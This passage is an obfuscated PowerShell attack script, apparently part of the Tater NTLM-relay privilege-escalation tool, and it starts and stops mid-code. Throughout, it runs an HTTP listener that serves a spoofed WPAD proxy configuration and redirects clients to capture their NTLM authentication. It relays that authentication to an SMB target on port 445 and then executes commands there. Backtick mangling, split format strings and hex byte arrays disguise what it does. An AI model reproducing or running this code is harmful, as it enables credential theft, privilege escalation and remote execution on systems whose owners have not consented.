        ${wPAD_d`I`RE`Ct_`hoS`T_bY`TEs} =  (VARiaBle mr9Pqh -ValUEO  )::"u`TF8".("{2}{1}{0}" -f 's','e','GetByt').Invoke(${W`pA`D_`DI`REc`T_hOsT})

        ${W`pad_`D`iRect_HOSt_`Fu`NCTi`oN_b`Ytes} = 0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,
                                           0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22 +
                                           ${wpa`D_`dIr`eCt`_`HOst_`ByteS} +
                                           0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,
                                           0x52,0x45,0x43,0x54,0x22,0x3b 
        
        ${wpa`D_DiR`ECT_`H`O`stS_b`YtES} += ${WPAd`_d`i`REC`T_ho`s`T_FuNcTIoN_`ByTES}
    }

    ${WpAD`_`p`ort_B`ytes} =   $MR9Pqh::"u`TF8".("{1}{0}{2}" -f'etByte','G','s').Invoke(${W`PadP`ORt})
    
    :HTTP_listener_loop while (${TaT`ER}."rUN`NIng")
    {

        if(${tAT`er}."SmBrELay_SU`cc`Ess")
        {
            &("{0}{1}{2}"-f 'Sto','pTa','ter')
        }

        ${tCp_rEqu`E`sT} = ${N`ULL}
        ${Tcp`_rE`Q`UEST_byt`ES} = &("{1}{2}{0}" -f 'ect','New-O','bj') ("{1}{3}{0}{2}" -f'tem','Sy','.Byte[]','s') 1024
        ${S`UPpRe`sS_wAi`TINg_m`E`Ss`A`GE} = ${Fa`lse}

        while(!${tAT`eR}."hTtP_l`is`TENeR".("{0}{1}{2}" -f'P','end','ing').Invoke() -and !${TA`T`ER}."hTTp`_ClI`E`NT"."conn`ec`TeD")
        {

            if(!${Sup`PReSs_wa`ITIn`g_m`EssAGe})
            {
                ${ta`TER}."C`on`soLE`_qUEUE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Waiting for incoming HTTP connection "))
                ${suPPRe`s`s`_`WaIT`INg_MeSSA`Ge} = ${t`RUe}
            }

            &("{2}{0}{1}"-f't-Sl','eep','Star') -s 1

            if(${tAT`eR}."smBRe`lAy_S`UCCE`ss")
            {
                &("{0}{1}{2}"-f 'S','to','pTater')
            }

        }

        if(!${t`A`TER}."hTT`p_ClI`e`Nt"."CoNNe`C`TeD")
        {
            ${TAt`ER}."Http_C`LIE`NT" = ${TAT`ER}."httP`_L`I`sTeNeR".("{0}{2}{3}{1}"-f'Acc','lient','e','ptTcpC').Invoke()
	        ${h`Tt`p_`STREAM} = ${T`Ater}."HttP_c`li`eNt".("{1}{3}{0}{2}" -f'rea','Ge','m','tSt').Invoke() 
        }

        while (${H`Ttp_sTRe`Am}."DaTa`AVAiL`AB`le")
        {
            ${HT`T`P_sTrEaM}.("{1}{0}" -f'ad','Re').Invoke(${Tcp_r`EQ`U`eS`T_ByTEs},0,${Tc`P_R`equ`Est_byteS}."le`NgTH")
        }

        ${TcP`_RE`qU`eST} =  (GET-cHilDiTEm varIaBLE:NCuZ).vaLuE::("{2}{0}{1}" -f 'S','tring','To').Invoke(${tcp_rEq`UE`sT_b`ytES})

        if(${tCP`_ReQ`UE`St} -like ("{1}{2}{0}"-f'20*','47-45-54','-') -or ${t`C`P_rEqU`Est} -like ("{3}{2}{1}{0}"-f'*','4-20','5-41-4','48-4') -or ${TCp_re`QuE`ST} -like ("{1}{5}{3}{4}{6}{2}{0}" -f'e-53-20*','4f','4','50-54','-','-','49-4f-'))
        {
            ${H`T`Tp_`Ra`W_uRl} = ${tc`p_R`eQ`Uest}.("{1}{0}{2}" -f'trin','Subs','g').Invoke(${Tc`P_rEQ`UesT}.("{2}{0}{1}" -f 'nd','exOf','I').Invoke(("{1}{0}" -f'0-','-2')) + 4,${t`c`p_reQ`UesT}.("{2}{1}{0}" -f 'g','ubstrin','S').Invoke(${t`Cp_`REQue`St}.("{0}{1}" -f 'Index','Of').Invoke(("{1}{0}" -f '0-','-2')) + 1).("{1}{0}"-f'xOf','Inde').Invoke(("{1}{0}"-f '-','-20')) - 3)
            ${h`TTp`_rAW`_urL} = ${ht`TP_r`AW`_`Url}.("{1}{0}"-f'it','Spl').Invoke("-") | &("{0}{2}{3}{1}"-f 'ForEa','ct','c','h-Obje'){[Char] $PfE::("{1}{0}" -f 'nt16','ToI').Invoke(${_},16)}
            ${t`A`TER}."rEQuesT`_R`AW`Url" = &("{1}{0}{2}" -f 'Objec','New-','t') ("{1}{0}{2}" -f'.Str','System','ing') (${h`TtP_r`A`w_U`RL},0,${Htt`p_ra`W`_UrL}."lE`Ng`Th")
        
            if(${TA`TER}."Req`Ue`st_rAwURl" -eq "")
            {
                ${TA`TER}."REQ`Ue`st_r`AwurL" = "/"
            }

        }

        if(${tC`p_`RequEst} -like ("{0}{9}{5}{10}{11}{6}{7}{1}{8}{2}{3}{4}" -f '*-','69','20','-','*','75','-72','-69-7A-61-74-','-6F-6E-3A-','41-','-74-68-6','F'))
        {
            ${Ht`TP_A`Ut`Ho`RiZATio`N_`headER} = ${Tc`p_r`E`quest}.("{0}{1}{2}" -f'S','ub','string').Invoke(${tc`P_r`eQ`UeSt}.("{1}{2}{0}" -f 'dexOf','I','n').Invoke(("{13}{8}{3}{7}{2}{1}{11}{12}{0}{4}{9}{6}{10}{5}"-f'61-74-','-','-6F','75-','6','A-20-','F','74-68','41-','9-6','-6E-3','72-6','9-7A-','-')) + 46)
            ${HTtP`_`AUthO`Ri`ZAtiO`N_`H`EAder} = ${HtTP`_AuTh`Or`IZatiO`N_HEAder}.("{2}{0}{1}"-f'ubstrin','g','S').Invoke(0,${ht`Tp_AUt`H`O`RIzATiON`_HEaDer}.("{2}{1}{0}" -f'Of','x','Inde').Invoke(("{1}{0}" -f'D-0A-','-0')))
            ${HTtp_Au`T`H`oRIzAtI`ON_HEa`d`er} = ${ht`TP_`AUTHORIzATiON_h`eAD`ER}.("{0}{1}"-f'Sp','lit').Invoke("-") | &("{4}{2}{1}{3}{0}" -f't','ac','orE','h-Objec','F'){[Char] ( GcI  VArIaBLE:pfE).VALue::("{0}{1}{2}" -f 'T','oI','nt16').Invoke(${_},16)}
            ${A`UTh`entIca`TI`on_`H`EaDEr} = &("{2}{0}{1}"-f 'b','ject','New-O') ("{4}{1}{3}{0}{2}"-f'm.S','y','tring','ste','S') (${hT`Tp_au`ThOR`I`zaTI`oN_H`EAder},0,${http`_AUt`Ho`RIZaT`Ion`_H`EADER}."l`ENGTh")
        }
        else
        {
            ${aUTH`e`NTiCA`TIoN`_hE`Ad`Er} =  ''
        }

        ${h`Tt`P_T`YPE} = ("{0}{1}"-f'H','TTP')
        ${hT`Tp_reQ`UeSt`_t`yPE} = ""
        
        if (${tAt`Er}."rEQ`UeST_`Raw`Url" -match ("{0}{1}{2}"-f'/w','pad','.dat'))
        {
            ${t`AT`Er}."R`eSpoNS`E_S`Ta`TUs`COde" = 0x32,0x30,0x30
            ${hTTp_`Re`SPO`NSE_p`hraSE} = 0x4f,0x4b

            ${hTtp`_WPa`d_`R`EspOnSE} = 0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x46,0x69,0x6e,0x64,0x50,0x72,
                                  0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28,0x75,0x72,0x6c,0x2c,0x68,
                                  0x6f,0x73,0x74,0x29,0x7b +
                                  ${Wpa`d_`DiRe`CT_Ho`stS_bytEs} +
                                  0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,
                                  0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x3a +
                                  ${wpa`D`_POR`T_b`YTEs} +
                                  0x22,0x3b,0x7d

            ${N`TlM} = ''
            ${ht`Tp_R`eQue`sT`_Ty`Pe} = ("{1}{0}" -f'AD','WP')
        }
        elseif (${T`At`ER}."Re`QU`est_Rawurl" -eq ("{1}{2}{0}"-f'HES','/GETHA','S'))
        {
            ${tA`TeR}."re`SPOnSE`_sT`A`TusCo`dE" = 0x34,0x30,0x31
            ${hTTP`_R`ES`po`NSE_p`Hra`Se} = 0x4f,0x4b
            ${nT`lm} = ("{0}{1}"-f 'NTL','M')
            ${Htt`P_rEQUEST`_T`yPE} = ("{1}{0}"-f'M','NTL')
        }
        else
        {
            ${tAT`Er}."Re`SP`on`Se_statUSCode" = 0x33,0x30,0x32

            ${HttP`_lo`C`ATIOn} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,
                             0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,
                             0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,
                             0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x45,0x78,0x70,0x69,
                             0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,
                             0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,
                             0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,
                             0x2f,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x3a +
                             ${HTtp`_Po`Rt_B`Y`TeS} +
                             0x2f,0x47,0x45,0x54,0x48,0x41,0x53,0x48,0x45,0x53,0x0d,0x0a

            ${ht`TP_rE`SPonsE_Ph`RA`se} = 0x4f,0x4b
            ${N`TLm} = ''
            ${HTt`p_reque`S`T_tY`pE} = ("{1}{0}{2}"-f'ire','Red','ct')

            if(${T`ATER}."htTP_clIent_Ha`N`d`le_`olD" -ne ${TAt`eR}."Ht`TP_C`lIe`Nt"."clI`eNt"."H`An`dLE")
            {
                ${t`AT`ER}."C`oN`so`L`E_QueUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Attempting to redirect to http://localhost: ") + ("$HTTPPort/gethashes "+'and'+' '+'tr'+'i'+'gger '+'rela'+'y'))
            }

        }

        if((${Ta`T`Er}."RE`qUe`ST_`RA`Wurl_OLd" -ne ${T`AtER}."ReQ`UesT_`RAW`UrL" -and ${ta`T`eR}."Htt`p_CLIeNT_h`A`Nd`le_`OlD" -ne ${tat`Er}."H`TTp`_`cLieNT"."c`LIeNT"."HAnd`le") -or ${t`AtEr}."Http_cliE`NT_`hA`NDLE_`o`LD" -ne ${t`AT`er}."ht`TP`_client"."C`lient"."H`ANdle")
        {
            ${TAt`ER}."c`Ons`OLE_QUe`Ue".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type request for  ") + ${T`A`Ter}."reqUes`T_Ra`Wu`Rl" + ("{2}{0}{3}{1}" -f 'r','m ',' received f','o') + ${TAT`ER}."htt`P_`CLIeNt"."clIE`NT"."R`e`mOTee`NdPOInT"."AddRE`SS")
        }

        if(${auTHEntIc`AtI`ON_he`Ad`Er}.("{1}{2}{0}" -f 'h','Star','tsWit').Invoke(("{0}{1}" -f'NTLM',' ')))
        {
            ${au`Th`E`NTiCATIo`N_h`eAD`er} = ${auTHent`IcAti`on_hEa`der} -replace ("{1}{0}" -f'M ','NTL'),''
            [byte[]] ${Ht`Tp_`R`EQ`UEst_bYTEs} =  ( geT-VARiAbLE  ("p"+"fE") -VALue )::("{3}{2}{1}{0}{4}" -f 'in','r','omBase64St','Fr','g').Invoke(${A`UT`HEntiC`Ati`O`N_hEad`er})
            ${t`AteR}."r`Esp`oNse`_`St`ATUScode" = 0x34,0x30,0x31
            ${h`T`Tp_reS`p`oN`se_`phraSE} = 0x4f,0x4b
            
            if (${hTtP_R`EquEsT`_`BY`T`es}[8] -eq 1)
            {

                if(${TAT`ER}."SMb_R`EL`AY_aCTIve`_`S`Tep" -eq 0)
                {
                    ${TaT`ER}."Smb`_`REl`A`Y_acTiV`E`_sTEp" = 1
                    ${t`ATER}."coNso`Le_QUe`Ue".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by  ") + ${T`AT`er}."HTTP_Cl`iE`Nt"."cl`IENt"."R`EmOt`eEn`dP`OINt"."aD`Dre`sS")
                    ${t`AtER}."COnsoLE_Q`Ue`UE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Grabbing challenge for relay from  ") + "$SMBRelayTarget")
                    ${Sm`B`_r`E`lAy_SOC`KET} = &("{2}{0}{1}"-f '-Ob','ject','New') ("{2}{1}{3}{0}{4}" -f 'i','ts.TC','System.Net.Socke','PCl','ent')
                    ${Sm`B_ReLaY_`So`c`KeT}.("{0}{1}" -f 'co','nnect').Invoke(${smbrE`L`A`YtArGeT},"445")
                    
                    if(!${S`MB`_rELa`y_sockET}."cON`NEcT`ed")
                    {
                        ${T`A`TEr}."cONSO`lE_`Q`Ue`UE".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay target is not responding "))
                        ${Ta`T`ER}."s`MB_re`LaY_ACTIv`e_s`Tep" = 0
                    }
                    
                    if(${Ta`TeR}."s`m`B_r`ELaY_AC`TivE_STep" -eq 1)
                    {
                        ${sM`B_relA`Y_`By`TES} = &("{1}{2}{0}{3}"-f 'all','SMBRe','layCh','enge') ${smB`_R`E`lA`y_`sOCKet} ${HTT`p_Req`UE`st_BYT`Es}
                        ${T`A`TeR}."Smb`_`RelAy_`AcTiVE_S`TEP" = 2
                        ${sMb_reLay`_b`yTEs} = ${smB_R`ElAY_`B`yTeS}[2..${s`mB_Rel`Ay_bY`TES}."lEn`gTh"]
                        ${sMb`_`USE`R_iD} = ${smB`_rel`Ay`_`BYt`Es}[34..33]
                        ${Smb_r`e`La`Y_ntLMssp} =  ( geT-item  ("v"+"ariabL"+"e"+":Nc"+"UZ") ).vaLUe::("{0}{2}{1}" -f'To','tring','S').Invoke(${SMb_R`el`A`y_`B`yteS})
                        ${sMB`_RE`L`AY_N`T`LmSSp} = ${s`MB_Re`Lay_nTlms`sp} -replace "-",""
                        ${SM`B_`REla`Y_`Nt`LmS`sp_INdeX} = ${s`M`B_`RELAY`_ntLMS`SP}.("{1}{0}" -f 'ndexOf','I').Invoke(("{1}{3}{2}{4}{0}" -f'000','4E','4','544C','D53535'))
                        ${sMb_RELA`Y_ntlM`SsP_B`Yt`Es_`inDEX} = ${s`mB`_rELA`y_NT`lMsSP_i`NdEX} / 2
                        ${S`m`B_`dOMA`In_LeNG`Th} = &("{1}{0}{2}{3}" -f 'taLe','Da','n','gth') (${smB_R`ELAy_`NtL`mSsP_byt`Es_Ind`EX} + 12) ${S`M`B_rE`LA`y_`BYTes}
                        ${smB_`domai`N_lEn`gtH_offs`E`T_bytes} = ${S`mb_R`E`LAy_B`Yt`ES}[(${SMB_rel`Ay_Nt`Lm`SSP_byt`E`S_`INdex} + 12)..(${s`M`B_RELay_NTLMSSp_`BYtes_`INDex} + 19)]
                        ${S`M`B`_TARgET`_lENg`TH} = &("{1}{0}{2}{3}" -f't','Da','aLeng','th') (${sMB_`R`Elay_n`T`l`mS`Sp_`Bytes_in`DEx} + 40) ${SMb_RelAy_by`T`ES}
                        ${s`m`B_`Ta`RGET_lEN`gTH`_`OFfset`_`BYTes} = ${SM`B_Rel`AY`_byT`Es}[(${SM`B_reLAy_nTLmssp_`BY`T`Es_`in`Dex} + 40)..(${Smb_r`e`Lay_`NtlmSS`p_byTe`S`_InDeX} + 55 + ${sMb_`dOmAi`N`_le`NGth})]
                        ${s`Mb_`ReLAy_`Ntl`m_`ch`AllEnGe} = ${SM`B_rel`AY_b`Y`TES}[(${s`MB_ReLAY`_ntlmSSP_b`Yt`Es_`i`ND`EX} + 24)..(${SM`B_`Re`la`y`_Nt`lmSsp_BYtEs`_`INDeX} + 31)]
                        ${smB_reS`e`R`VeD} = ${s`Mb_r`e`L`AY_ByTEs}[(${smb_`RE`la`y_`NtlMsSp_bYTes_ind`eX} + 32)..(${smB_R`e`la`Y_nTLmS`sP_bY`TES_iN`dex} + 39)]
                        ${s`MB_rElAy_t`ARg`Et_de`TaIls} = ${Smb_`Relay_BY`T`ES}[(${smb_RELAy`_`NTL`mSSp_bYt`ES_`INdEx} + 56 + ${sMb_DoMAiN_`l`ENg`TH})..(${sMB_RE`lAy_`NTlmS`sp`_ByTE`S`_I`ND`ex} + 55 + ${SM`B_dOm`AI`N_LeNgtH} + ${Sm`B_tArgEt_`L`EngtH})]
                    
                        ${Ht`T`p_nTl`m_Bytes} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                           ${s`mb_DOmAIN_lEnGth`_`Of`FSET_bYT`eS} +
                                           0x05,0xc2,0x89,0xa2 +
                                           ${sMb`_re`LA`y`_NTLM_chal`LenGe} +
                                           ${Sm`B_r`esErVEd} +
                                           ${sMB_Ta`RG`e`T_`Leng`T`H_o`FFs`Et`_bYtes} +
                                           ${Smb_`RE`LAY_TAr`Ge`T_De`T`Ails}
                    
                        ${ntLM`_Ch`AL`l`eNge_b`AS`E64} =   (  diR  vaRIablE:pfe  ).vAlUe::"tOB`AsE`64sTR`I`NG"(${H`TtP_NtLM_bY`TES})
                        ${NT`LM} = ("{0}{1}"-f'NT','LM ') + ${NT`Lm_C`hallENG`E`_`BaSe`64}
                        ${NtLm`_chaL`LeNgE} = &("{4}{3}{1}{2}{0}" -f'lenge','Ch','al','MBNTLM','S') ${SmB_re`L`Ay_B`YTes}
                        ${t`A`Ter}."h`Ttp_`chaLlEn`Ge_Qu`eUe".("{1}{0}" -f'd','Ad').Invoke(${t`ATeR}."Htt`P_cl`IENt"."Cl`ieNT"."RE`moTeE`Nd`PO`INt"."a`DdrEss"."IP`AD`DR`esstOSTrI`Ng" + ${TA`T`er}."H`Ttp`_Cli`enT"."cLi`ent"."R`emOTeEndp`oI`NT"."P`orT" + ',' + ${N`TLM`_ChaLlEngE})
                        ${taT`eR}."CO`NsOLe`_`quEue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Received challenge $NTLM_challenge  ") + ('for'+' '+'r'+'e'+'lay '+'fro'+'m '+"$SMBRelayTarget"))
                        ${Ta`TER}."c`OnsOLe_`quEUE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Providing challenge  ") + ("$NTLM_challenge "+'fo'+'r '+'rela'+'y '+'to'+' '+'') + ${tAt`er}."Ht`TP`_C`liEnT"."C`Li`eNT"."reMOt`eEn`Dpo`InT"."a`DdR`eSS")
                        ${t`ATEr}."Smb`_rE`lay_Act`iVE_STEp" = 3
                    }
                    else
                    {
                        ${Nt`LM} = &("{4}{1}{0}{2}{3}{5}"-f 'l','LMCha','len','ge','NT','Base64')
                    }

                }
                else
                {
                     ${nT`Lm} = &("{4}{3}{0}{1}{2}{5}"-f'Ch','all','eng','M','NTL','eBase64')
                }
                
                ${tA`TER}."r`ESpO`Ns`E_StatU`s`cODE" = 0x34,0x30,0x31
                ${hTTp_ReS`P`oNsE_`P`h`RA`Se} = 0x4f,0x4b
                
            }
            elseif (${hT`TP_`ReQ`UEs`T_ByTeS}[8] -eq 3)
            {
                ${N`TLm} = ("{0}{1}"-f 'N','TLM')
                ${Http_`N`T`LM`_O`Ffset} = ${H`TTP`_R`EQueSt`_b`YTes}[24]
                ${h`TtP`_N`TLm_leNgTH} = &("{2}{0}{1}" -f 'a','Length','Dat') 22 ${h`TTp`_Re`qUEsT`_by`TEs}
                ${hTtp_N`TL`M_DO`M`Ain_lEN`G`TH} = &("{2}{1}{0}" -f 'th','aLeng','Dat') 28 ${H`TtP_`REq`Ues`T_bY`TeS}
                ${H`TTP_nTL`m`_DoM`AI`N`_OFf`seT} = &("{0}{1}{2}{3}"-f'Da','ta','Leng','th') 32 ${HT`T`p`_r`Equ`Est_BYtEs}
                       
                if(${H`TtP_ntL`M_DomAin_le`Ng`TH} -eq 0)
                {
                    ${hTTP_NtLm`_`D`OmAiN_`S`T`RiNg} = ''
                }
                else
                {  
                    ${HTtP`_NTL`M_dOM`AiN`_StRiNg} = &("{1}{0}{2}" -f'ToSt','Data','ring') ${hTTP_Ntl`M`_Domai`N_Le`NgtH} 0 0 ${H`TtP_n`TLm_d`oMaIn`_OFf`SET} ${ht`TP`_REQUest_`B`yt`ES}
                }

                ${ht`Tp`_ntLm`_uSeR_`lEng`Th} = &("{1}{2}{0}"-f'taLength','D','a') 36 ${hT`Tp_REq`UEs`T_bYt`es}
                ${HTTp_`NT`Lm_HOSt`_l`eN`Gth} = &("{1}{0}{3}{2}"-f 'ta','Da','gth','Len') 44 ${HTT`p`_rEq`U`EsT_bY`TES}

                if ( (GET-VaRIABle  nCUZ  -valUeONL)::"t`oS`TRInG"(${H`TtP_REQ`UES`T`_b`Y`TES}[16]) -eq '58' -and   (  GeT-VArIaBLe Ncuz  ).VaLue::"T`OST`RING"(${httP_`Req`UE`ST`_BYteS}[24]) -eq '58' -and   ( GI  varIAbLE:nCuz ).VALUE::"TO`sTRIng"(${H`TT`p_rE`Q`UesT_BYTEs}[32]) -eq '58')
                {
                    ${H`TTp_n`TLm_uS`ER_StRING} = ''
                    ${h`TTP_`N`T`LM_HOSt_`sTRIng} = ''
                }
                else
                {
                    ${H`TTP_nt`Lm_USe`R`_`St`RiNG} = &("{2}{1}{0}" -f 'aToString','at','D') ${htTp`_nTl`m`_usER_`LEnG`Th} ${HTtp_`N`Tl`m_D`OmAIn_`l`eNgTH} 0 ${hTTp_Nt`LM_d`o`mAI`N_`OffseT} ${h`T`Tp`_`REQUeST`_BYtES}
                    ${hTTP_NT`LM_hos`T`_STri`NG} = &("{0}{1}{2}" -f 'Dat','aTo','String') ${hTt`P_nTL`m_hO`St_LEn`gtH} ${HtTP_NTl`m_doMAIn_lE`N`g`TH} ${h`Ttp_Nt`L`M_USEr_Len`GtH} ${h`TTp`_`NTLM_DO`m`AiN_`OfFSet} ${h`TTp_`R`E`quE`St_BYtes}
                }
          
                ${NT`lM_`RESPOnSe} =   $NcUz::"TOs`TR`iNg"(${h`TtP_rE`que`st`_ByTes}[${HTtP_`NTlM`_`oFfseT}..(${htTP`_`NTL`m_O`FfSEt} + ${h`TTp_NtlM_`l`ENg`TH})]) -replace "-",""
                ${ntLm_r`ESP`O`N`sE} = ${nTLM_Re`SPo`N`Se}.("{2}{1}{0}"-f 't','nser','I').Invoke(32,':')
                ${t`Ater}."ReSP`onsE_sTa`TU`sCODE" = 0x32,0x30,0x30
                ${h`Tt`P_`ReSpOnsE`_PHrasE} = 0x4f,0x4b
                ${NTl`M_Ch`Al`l`enGE} = ''
                
                if (${tAT`ER}."SMb_Rel`AY_Act`iv`e_St`Ep" -eq 3)
                {
                    ${tA`TER}."Co`NS`oLe_qUeUE".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Sending response for  ") + ("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'fo'+'r '+'r'+'e'+'lay '+'t'+'o '+'') + "$SMBRelaytarget")
                    ${s`mb_r`ElaY`_resp`on`se`_re`T`URn`_bYtES} = &("{3}{0}{2}{1}"-f'yRespon','e','s','SMBRela') ${smB_Re`LA`Y_sOck`Et} ${HTtp_rE`QUEst`_b`Yt`es} ${SMb`_`USE`R_iD}
                    ${SMB_rEl`A`y`_`ResP`OnS`E_rE`T`URn`_BYteS} = ${s`m`B_R`ElA`y_ReSP`onSE_rE`Tu`R`N_`BYtes}[1..${smb_R`EL`Ay_reSPOnse_`RE`Tu`Rn_`ByteS}."LENG`TH"]
                    
                    if(!${sMb`_ReLaY_F`A`ILED} -and  ( vAriAbLE ("n"+"CUZ")  -vAluEO  )::"T`osTrinG"(${s`Mb_relay_`REspon`S`E_`RE`TuR`N_byteS}[9..12]) -eq (("{0}{2}{1}"-f '00-00','00-00','-')))
                    {
                        ${t`AT`ER}."c`ONSo`lE`_QueUe".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay  ") + ('au'+'thent'+'icat'+'ion '+'succes'+'sfu'+'l '+'for'+' '+"$HTTP_NTLM_domain_string\") + ("$HTTP_NTLM_user_string "+'on'+' '+"$SMBRelayTarget"))
                        ${T`AT`er}."S`M`B_RelAy`_a`CTIVe`_STEP" = 4
                        &("{3}{0}{1}{2}{4}"-f 'B','Re','lay','SM','Execute') ${Sm`B_R`elaY_so`cKeT} ${smb_US`E`R_id}          
                    }
                    else
                    {
                        ${t`A`TER}."conSOlE_q`Ue`Ue".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay  ") + ('authentic'+'a'+'t'+'ion '+'fail'+'ed '+'for'+' '+"$HTTP_NTLM_domain_string\") + ("$HTTP_NTLM_user_string "+'o'+'n '+"$SMBRelayTarget"))
                        ${Tat`Er}."smB_`RelAy_A`C`TIve_St`ep" = 0
                        ${SMb_`RElAY_S`oC`kET}.("{0}{1}"-f'C','lose').Invoke()
                    }

                }

            }
            else
            {
                ${NT`Lm} = ("{0}{1}" -f 'NT','LM')
            }
             
        }

        ${htt`P`_TIMEs`T`AMp} = &("{1}{0}" -f'et-Date','G') -format ('r')
        ${HtT`p_`Ti`MES`TaMP} =  (get-vaRIaBLE  ("Mr"+"9PQH")  ).VaLue::"u`TF8".("{2}{1}{0}"-f'tBytes','e','G').Invoke(${HTt`P_Tim`eSt`AMp})
        
        ${HTTP_w`w`W_aUT`H`EN`TICaTe_`HEaD`eR} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,
                                        0x74,0x65,0x3a,0x20

        if(${N`TLm})
        {
            ${n`TLM} =  (VARIAblE ('m'+'r9pqH')  ).VaLUe::"UT`F8".("{2}{1}{0}"-f'es','tByt','Ge').Invoke(${n`Tlm})

            ${HT`Tp_rEsP`OnSE} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${T`At`Er}."RESpon`s`e_statusCO`dE" +
                             0x20 +
                             ${HTTP_r`Es`PONSE_`PHrase} +
                             0x0d,0x0a,0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,
                             0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,
                             0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,
                             0x0d,0x0a,0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,
                             0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,
                             0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a +
                             ${httP_wWw_`AUtH`EnTi`CA`Te_heaD`Er} +
                             ${N`TLM} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x0d,0x0a
        }
        elseif(${HTtp`_RE`QUeST`_tY`Pe} -eq ("{1}{0}" -f 'AD','WP'))
        {
            ${H`T`Tp_reSP`oNsE} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${T`A`TEr}."rEs`POnsE`_`s`TaTusCOde" +
                             0x20 +
                             ${Ht`TP`_rEsP`ONSE_P`H`RASE} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             ${ht`TP_`co`N`TE`Nt_LEngtH`_`BYT`Es} +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${hTTP_tIm`Es`T`AmP} +
                             0x0d,0x0a,0x0d,0x0a +
                             ${H`Ttp_W`pa`D_RESp`oNSE} 
        }
        elseif(${htt`p`_`REQUeSt_tYpe} -eq ("{0}{1}{2}"-f'Red','irec','t'))
        {
            ${hTT`P_r`ESpoN`SE} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             ${Tat`eR}."R`esPO`NSe_`s`TatuScOdE" +
                             0x20 +
                             ${HTTp_`RESpon`sE_PHR`A`sE} +
